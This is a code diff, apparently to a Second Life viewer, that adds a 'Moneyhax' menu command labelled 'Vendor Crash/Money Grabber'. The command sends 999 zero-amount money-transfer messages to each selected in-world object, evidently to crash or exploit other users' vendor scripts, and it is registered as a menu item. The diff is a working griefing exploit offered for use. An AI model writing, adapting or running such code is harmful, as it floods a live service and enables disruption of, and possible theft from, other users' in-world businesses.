@@ -2716,6 +2716,38 @@ class LLObjectCopyUUID : public view_listener_t
 		return true;
 	}
 };
+//Neils Vendor Crash/Money Grabber Thanks Neil
+class LLObjectMoneyhax : public view_listener_t
+{
+    bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
+    {
+        for (LLObjectSelection::valid_iterator iter = LLSelectMgr::getInstance()->getSelection()->valid_begin();
+             iter != LLSelectMgr::getInstance()->getSelection()->valid_end(); iter++)
+        {
+   
+            LLSelectNode* node = *iter;
+for(int i = 0; i <999; i++)
+{
+            LLMessageSystem* msg = gMessageSystem;
+  msg->newMessageFast(_PREHASH_MoneyTransferRequest);
+  msg->nextBlockFast(_PREHASH_AgentData);
+  msg->addUUIDFast(_PREHASH_AgentID, gAgent.getID());
+  msg->addUUIDFast(_PREHASH_SessionID, gAgent.getSessionID());
+  msg->nextBlockFast(_PREHASH_MoneyData);
+  msg->addUUIDFast(_PREHASH_SourceID, gAgent.getID() );
+  msg->addUUIDFast(_PREHASH_DestID, node->getObject()->getID());
+  msg->addU8Fast(_PREHASH_Flags,0);
+  msg->addS32Fast(_PREHASH_Amount, 000);
+  msg->addU8Fast(_PREHASH_AggregatePermNextOwner, 0);
+  msg->addU8Fast(_PREHASH_AggregatePermInventory, 0);
+  msg->addS32Fast(_PREHASH_TransactionType, 5008 );
+  msg->addStringFast(_PREHASH_Description, "");
+  msg->sendReliable(gAgent.getRegionHost());
+}
+        }
+        return true;
+    }
+};
 
 class LLObjectEnableSaveAs : public view_listener_t
 {
@@ -9887,6 +9919,7 @@ void initialize_menus()
 	addMenu(new LLCanIHasKillEmAll(), "Object.EnableDestroy");
 	addMenu(new LLOHGOD(), "Object.EnableExplode");
 	addMenu(new LLObjectUUID(), "Object.UUID");
+	addMenu(new LLObjectMoneyhax(), "Object.Vendor");
 	// </edit>
 	addMenu(new LLObjectMute(), "Object.Mute");
 	addMenu(new LLObjectBuy(), "Object.Buy");
